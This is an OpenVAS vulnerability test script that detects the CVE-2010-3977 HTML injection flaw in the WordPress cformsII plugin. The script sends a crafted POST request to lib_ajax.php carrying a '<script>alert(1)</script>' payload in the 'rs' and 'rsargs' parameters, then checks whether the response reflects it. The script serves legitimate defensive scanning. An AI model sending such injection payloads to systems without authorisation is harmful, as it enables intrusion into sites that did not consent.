###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_mult_html_injection_vuln.nasl 13960 2019-03-01 13:18:27Z cfischer $
#
# WordPress Plugin cformsII 'lib_ajax.php' Multiple HTML Injection Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801628");
  script_version("$Revision: 13960 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-01 14:18:27 +0100 (Fri, 01 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-11-16 10:37:01 +0100 (Tue, 16 Nov 2010)");
  script_bugtraq_id(44587);
  script_cve_id("CVE-2010-3977");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("WordPress Plugin cformsII 'lib_ajax.php' Multiple HTML Injection Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/42006");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/62938");
  script_xref(name:"URL", value:"http://www.conviso.com.br/security-advisory-cform-wordpress-plugin-v-11-cve-2010-3977/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  code in the context of the application.");
  script_tag(name:"affected", value:"WordPress plugin cforms Version 11.5 and earlier.");
  script_tag(name:"insight", value:"The flaws are caused by improper validation of user-supplied
  input passed via the 'rs' and 'rsargs' parameters to
  wp-content/plugins/cforms/lib_ajax.php, which allows attackers to execute
  arbitrary HTML and script code on the web server.");
  script_tag(name:"solution", value:"Upgrade to cforms Version 11.6.1 or later.");
  script_tag(name:"summary", value:"This host is running cformsII WordPress Plugin and is prone to
  multiple HTML injection vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.deliciousdays.com/cforms-plugin/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);

if (dir == "/") dir = "";
hostname = http_host_name(port:port);

req = string("POST ",dir,"/wp-content/plugins/cforms/lib_ajax.php HTTP/1.1\r\n",
             "Host: ",hostname,"\r\n",
             "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n",
             "Content-Length: 92\r\n\r\n",
             "rs=<script>alert(1)</script>&rst=&rsrnd=1287506634854&rsargs[]=1$#",
             "$<script>alert(1)</script>\r\n");
res = http_keepalive_send_recv(port:port, data:req);

if(('<script>alert(1)</script>' >< res) &&
    egrep(pattern:"^HTTP/.* 200 OK", string:res))
{
  security_message(port:port);
  exit(0);
}

exit(99);